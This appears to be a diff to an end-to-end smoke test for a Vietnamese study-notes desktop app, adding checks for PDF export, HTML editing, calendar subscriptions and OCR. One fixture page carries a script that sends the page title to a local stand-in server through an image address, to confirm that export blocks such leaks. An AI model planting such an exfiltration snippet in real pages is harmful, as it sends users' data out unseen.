@@ -33,7 +33,13 @@ writeFileSync(path.join(notes, '.docs-meta.json'), legacyMeta)
 writeFileSync(path.join(notes, '.docs-notes.json'), JSON.stringify({ version: 1, docs: { 'devops/Kubernetes.md': { items: [], docNote: { text: 'Ghi chú từ bản cũ', updated: 1 } } } }))
 // A web server on this PC, standing in for "the internet" in the safety checks.
 const webHits = []
+const SUB_ICS = ['BEGIN:VCALENDAR', 'VERSION:2.0', 'PRODID:-//Trường//TKB//VI', 'BEGIN:VEVENT', 'UID:tkb-toan@truong', 'DTSTAMP:20300101T000000Z', 'DTSTART:20300306T130000', 'DTEND:20300306T153000', 'SUMMARY:Toán rời rạc', 'LOCATION:C2', 'END:VEVENT', 'END:VCALENDAR'].join('\r\n')
 const web = createServer((req, res) => {
+  if (req.url === '/lich.ics') {
+    res.writeHead(200, { 'Content-Type': 'text/calendar; charset=utf-8' })
+    res.end(SUB_ICS)
+    return
+  }
   webHits.push(req.url)
   res.writeHead(200, { 'Content-Type': 'image/svg+xml' })
   res.end('<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"/>')
@@ -41,7 +47,7 @@ const web = createServer((req, res) => {
 await new Promise((r) => web.listen(0, '127.0.0.1', r))
 const WEB = `http://127.0.0.1:${web.address().port}`
 // A page that tries to send something out from the PDF export window, through an image address.
-writeFileSync(path.join(library, 'backend', 'Ảnh từ web.html'), `<!doctype html><html><head><meta charset="utf-8"><title>Ảnh từ web</title></head><body><h1>Ảnh từ web</h1><img src="${WEB}/leak?from=page"></body></html>`)
+writeFileSync(path.join(library, 'backend', 'Ảnh từ web.html'), `<!doctype html><html><head><meta charset="utf-8"><title>Ảnh từ web</title></head><body><h1>Ảnh từ web</h1><img src="${WEB}/own-picture.svg"><script>const i = new Image(); i.src = '${WEB}/leak?made-up=' + encodeURIComponent(document.title); document.body.append(i)</script></body></html>`)
 // Files for the safety checks (issues #1, #2, #3).
 const ATTACK = 'backend/Tài liệu lạ.html'
 writeFileSync(
@@ -132,7 +138,16 @@ app.process().stderr?.on('data', (d) => (mainLog += d))
 const page = await app.firstWindow()
 // Errors of the app itself. Messages from inside documents (doc://...) don't count: the test
 // library has a page that deliberately tries forbidden things, and those must fail.
-page.on('console', (m) => m.type() === 'error' && !m.location().url.startsWith('doc://') && !/doc:\/\/library\//.test(m.text()) && errors.push(`${m.text()} (${m.location().url})`))
+// The OCR engine prints harmless notes about settings its language data mentions ("Parameter not found").
+page.on(
+  'console',
+  (m) =>
+    m.type() === 'error' &&
+    !m.location().url.startsWith('doc://') &&
+    !/doc:\/\/library\//.test(m.text()) &&
+    !m.text().startsWith('Warning: Parameter not found') &&
+    errors.push(`${m.text()} (${m.location().url})`)
+)
 page.on('pageerror', (e) => errors.push(String(e)))
 let dialogAnswer = 'dismiss'
 /**
@@ -910,7 +925,10 @@ try {
   }, leakPdf)
   await page.evaluate((id) => window.api.exportPdf(id, false), leakId)
   await app.evaluate(({ dialog }) => (dialog.showSaveDialog = globalThis.__realSave2))
-  check(viewHits > 0 && existsSync(leakPdf) && webHits.length === 0, `export to PDF makes no request to the web (reading: ${viewHits}, exporting: ${webHits.length})`)
+  check(
+    viewHits > 0 && existsSync(leakPdf) && webHits.length === 1 && webHits[0] === '/own-picture.svg',
+    `export to PDF loads only the pictures written in the file, nothing a script makes up (exporting: ${webHits.join(', ')})`
+  )
 
   await app.evaluate(({ shell }) => {
     globalThis.__realExternal = shell.openExternal
@@ -1623,6 +1641,156 @@ try {
     /<p>Một câu( |&nbsp;)<b>đậm<\/b><\/p>\n<p>Đoạn mới<\/p>/.test(noteAfter) && noteAfter.slice(0, noteAfter.indexOf('<body>')) === noteBefore.slice(0, noteBefore.indexOf('<body>')),
     `HTML: bold kept, Enter made a new paragraph, the rest of the file is unchanged (${JSON.stringify(noteBody(noteAfter).slice(0, 160))})`
   )
+
+  step('34. HTML: a new paragraph becomes a heading, then a list; Enter on an empty item ends the list')
+  await page.click('.doc-controls >> text=Sửa chữ')
+  await page.waitForSelector('.html-format')
+  let fmtFrame = null
+  for (let i = 0; i < 100 && !fmtFrame; i++) {
+    fmtFrame = page.frames().find((fr) => fr.url().includes('?edit=1')) ?? null
+    if (!fmtFrame) await page.waitForTimeout(100)
+  }
+  await fmtFrame.waitForSelector('p[data-sd-block] >> text=Đoạn mới')
+  await fmtFrame.click('p[data-sd-block] >> text=Đoạn mới')
+  await page.keyboard.press('End')
+  await page.keyboard.press('Enter')
+  await page.keyboard.type('Mục lớn')
+  await page.selectOption('.html-format .block-type', 'h2')
+  await fmtFrame.waitForSelector('h2[data-sd-new]')
+  await page.keyboard.press('Enter')
+  await page.selectOption('.html-format .block-type', 'ul')
+  await fmtFrame.waitForSelector('ul[data-sd-new-list] li')
+  await page.keyboard.type('Ý một')
+  await page.keyboard.press('Enter')
+  await page.keyboard.type('Ý hai')
+  await page.keyboard.press('Enter')
+  await page.keyboard.press('Enter')
+  await page.keyboard.type('Kết thúc')
+  const pageBeforeSave = await fmtFrame.evaluate(() => document.body.innerHTML.replace(/<style[\s\S]*$/, ''))
+  await page.click('.edit-bar >> text=Lưu (Ctrl+S)')
+  await page.waitForSelector('.edit-bar', { state: 'detached', timeout: 10000 })
+  const withList = read('backend/Ghi chép HTML.html')
+  check(
+    withList.includes('<p>Đoạn mới</p>\n<h2>Mục lớn</h2>\n<ul>\n  <li>Ý một</li>\n  <li>Ý hai</li>\n</ul>\n<p>Kết thúc</p>'),
+    `new paragraphs can become a heading or a list, written after their block (${JSON.stringify(withList.slice(withList.indexOf('<p>Đoạn'), withList.indexOf('</body>')))}${withList.includes('<h2>Mục lớn') ? '' : ` page: ${pageBeforeSave}`})`
+  )
+
+  step('35. Empty folders show in the tree; notes move to another workspace folder with their tags')
+  await menuOn('.root-row:has-text("library") .row.folder.root', 'Thư mục mới…')
+  await nameDialog(['Trống'])
+  await page.waitForSelector(`.doc-list .row.folder[data-folder-id="${libKey}/Trống"]`)
+  check(existsSync(file('Trống')) && (await page.locator(`.doc-list .row.folder[data-folder-id="${libKey}/Trống"]`).count()) === 1, 'a new folder may be empty, and shows in the tree')
+  const writtenId = await page.evaluate(async () => (await window.api.getLibrary()).docs.find((d) => d.rel === 'Viết thử.md').path)
+  await page.evaluate((id) => window.api.updateMeta(id, { tags: ['chuyen'] }), writtenId)
+  await page.waitForTimeout(300)
+  await page.evaluate(({ id, target }) => {
+    const dt = new DataTransfer()
+    dt.setData('application/x-studydocs-doc', id)
+    document.querySelector(`.root-row .row.folder.root[data-folder-id="${target}"]`).dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }))
+  }, { id: writtenId, target: keyOf(extra) })
+  for (let i = 0; i < 50 && !existsSync(path.join(extra, 'Viết thử.md')); i++) await page.waitForTimeout(100)
+  await page.waitForTimeout(500)
+  const extraTags = JSON.parse(readFileSync(path.join(dataDir(extra), 'meta.json'), 'utf8')).docs['Viết thử.md']?.tags
+  check(existsSync(path.join(extra, 'Viết thử.md')) && !existsSync(file('Viết thử.md')) && extraTags?.includes('chuyen') && !metaOfLib()['Viết thử.md'], 'a note dragged to another workspace folder moves there, its tags move to that folder\'s data')
+
+  step('36. Closing with unsaved edits asks in the app\'s own dialog')
+  await openDoc('React useEffect — khi nào chạy?')
+  await docPathIs(REACT)
+  await page.click('.doc-controls >> text=Raw')
+  await page.waitForSelector('.raw-host .cm-content')
+  await page.click('.raw-host .cm-content')
+  await page.keyboard.press('Control+End')
+  await page.keyboard.type(' (dở)')
+  await page.waitForTimeout(300)
+  await setAnswer('dismiss') // "Ở lại"
+  const askedBeforeClose = await page.evaluate(() => window.__smokeAsked)
+  await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().find((w) => w.isVisible())?.close())
+  await page.waitForFunction((n) => window.__smokeAsked > n, askedBeforeClose, { timeout: 5000 })
+  await page.waitForTimeout(300)
+  check((await page.evaluate(() => document.title.length >= 0)) && (await page.locator('.raw-toolbar .dirty-dot').count()) === 1, 'closing with unsaved edits asks in the app; "Stay" keeps the window and the edit')
+  await setAnswer('accept')
+  await page.click('.raw-toolbar >> text=Đóng raw')
+  await page.waitForSelector('.raw-toolbar', { state: 'detached' })
+  await setAnswer('dismiss')
+
+  step('37. PDF: the character maps and JPEG 2000 decoder of pdf.js ship with the app')
+  const pdfjsFiles = await page.evaluate(async () => {
+    const get = async (p) => (await fetch(new URL(p, document.baseURI))).status
+    return [await get('pdfjs/cmaps/UniJIS-UCS2-H.bcmap'), await get('pdfjs/wasm/openjpeg.wasm'), await get('pdfjs/standard_fonts/FoxitSerif.pfb')]
+  })
+  check(pdfjsFiles.join(',') === '200,200,200', `pdf.js finds its CJK character maps, standard fonts and JPEG 2000 decoder (${pdfjsFiles.join(', ')})`)
+
+  step('38. Calendar: a calendar followed by its link, and a reminder')
+  await page.click('.sidebar-head .icon-btn[title="Lịch học"]')
+  await page.waitForSelector('.calendar-host.fc')
+  await page.click('.calendar-toolbar >> text=Lịch theo dõi…')
+  await page.waitForSelector('dialog.subs-dialog[open]')
+  await page.fill('dialog.subs-dialog input[aria-label="Tên lịch"]', 'Trường')
+  await page.fill('dialog.subs-dialog input[aria-label="Link lịch (iCal)"]', `${WEB}/lich.ics`)
+  await page.click('dialog.subs-dialog .subs-buttons .btn.primary')
+  await page.waitForSelector('dialog.subs-dialog .subs-list li >> text=1 sự kiện')
+  await page.click('dialog.subs-dialog header .icon-btn')
+  const subbed = await page.evaluate(() => window.api.calendarRange('2030-03-06', '2030-03-07'))
+  const toan = subbed.find((o) => o.summary === 'Toán rời rạc')
+  check(!!toan && toan.readOnly && toan.source === 'Trường' && !readFileSync(path.join(userData, 'data', 'calendar.ics'), 'utf8').includes('Toán rời rạc'), 'a calendar followed by its link shows its events, read-only, without copying them')
+  await page.click('.calendar-toolbar .icon-btn[title="Trước"]')
+  await page.click(`.fc-event[data-key="${toan.uid}|${toan.rid}"]`)
+  await page.waitForSelector('.event-panel h2 >> text=Toán rời rạc')
+  check((await page.locator('.event-panel .event-actions').count()) === 0 && (await page.textContent('.event-panel .event-meta')).includes('Trường'), 'its classes have no Edit/Delete; the panel says where they come from')
+  // A reminder 15 minutes before: a standard VALARM.
+  await page.click('.calendar-toolbar >> text=+ Sự kiện')
+  await page.waitForSelector('dialog.event-dialog[open]')
+  await page.fill('dialog.event-dialog input[name="summary"]', 'Ôn thi')
+  await page.fill('input[aria-label="Ngày bắt đầu"]', '2030-03-07')
+  await page.fill('input[aria-label="Giờ bắt đầu"]', '1930')
+  await page.fill('input[aria-label="Giờ kết thúc"]', '21h')
+  await page.selectOption('select[aria-label="Nhắc trước"]', '15')
+  await page.click('dialog.event-dialog footer .btn.primary')
+  await page.waitForSelector('dialog.event-dialog', { state: 'detached' })
+  const ics2 = readFileSync(path.join(userData, 'data', 'calendar.ics'), 'utf8')
+  check(ics2.includes('SUMMARY:Ôn thi') && ics2.includes('DTSTART:20300307T193000') && ics2.includes('DTEND:20300307T210000') && ics2.includes('TRIGGER:-PT15M'), 'time typed as "1930" / "21h" (24-hour); a reminder is saved as a standard VALARM')
+
+  step('39. OCR: a scanned PDF gets text (offline), then Ctrl+F and search find it')
+  await page.click('dialog.subs-dialog header .icon-btn').catch(() => {})
+  const scanPng = await page.evaluate(() => {
+    const c = document.createElement('canvas')
+    c.width = 1240
+    c.height = 1754
+    const g = c.getContext('2d')
+    g.fillStyle = '#fff'
+    g.fillRect(0, 0, c.width, c.height)
+    g.fillStyle = '#111'
+    g.font = '48px Times New Roman'
+    ;['Giao thức TCP bảo đảm thứ tự', 'các gói tin và gửi lại khi mất.'].forEach((l, i) => g.fillText(l, 120, 200 + i * 90))
+    return c.toDataURL('image/png')
+  })
+  const scanPdf = file('Bản scan.pdf')
+  await app.evaluate(async ({ BrowserWindow }, { png, out }) => {
+    const w = new BrowserWindow({ show: false, webPreferences: { sandbox: true } })
+    await w.loadURL('data:text/html,' + encodeURIComponent(`<html><body style="margin:0"><img src="${png}" style="width:100%"></body></html>`))
+    process.getBuiltinModule('fs').writeFileSync(out, await w.webContents.printToPDF({ pageSize: 'A4', margins: { marginType: 'none' } }))
+    w.destroy()
+  }, { png: scanPng, out: scanPdf })
+  await page.waitForSelector('.doc-list .row.doc >> text=Bản scan', { timeout: 15000 })
+  await openDoc('Bản scan')
+  await page.waitForSelector('.pdf-ocr-bar >> text=Nhận dạng chữ (OCR)', { timeout: 15000 })
+  await page.click('.pdf-ocr-bar >> text=Nhận dạng chữ (OCR)')
+  await page.waitForSelector('.pdf-ocr-bar >> text=Nhận dạng lại', { timeout: 120000 })
+  await page.waitForSelector('.ocr-layer span', { timeout: 10000 })
+  const ocrText = await page.evaluate(() => document.querySelector('.ocr-layer').textContent)
+  check(/TCP/.test(ocrText) && /gói tin/.test(ocrText), `OCR reads the scanned page, Vietnamese accents included ("${ocrText}")`)
+  await page.keyboard.press('Control+F')
+  await page.fill('.find-bar input', 'gui lai')
+  await page.waitForFunction(() => /^\d+\/\d+$/.test(document.querySelector('.find-count')?.textContent ?? ''))
+  const ocrFind = await page.textContent('.find-count')
+  await page.press('.find-bar input', 'Escape')
+  let ocrSearch = []
+  for (let i = 0; i < 40 && !ocrSearch.length; i++) {
+    ocrSearch = await page.evaluate(() => window.api.search('bao dam thu tu'))
+    if (!ocrSearch.length) await page.waitForTimeout(250)
+  }
+  check(ocrFind === '1/1' && ocrSearch.some((h) => h.path.endsWith('Bản scan.pdf')), `its text is found with Ctrl+F (${ocrFind}) and by search (${ocrSearch.length})`)
+  check(readdirSync(path.join(userData, 'ocr')).length === 1, 'OCR text is kept in the app\'s data; the PDF is not changed')
 
   check(errors.length === 0, `no console errors${errors.length ? ': ' + errors.join(' | ') : ''}`)
 } catch (err) {
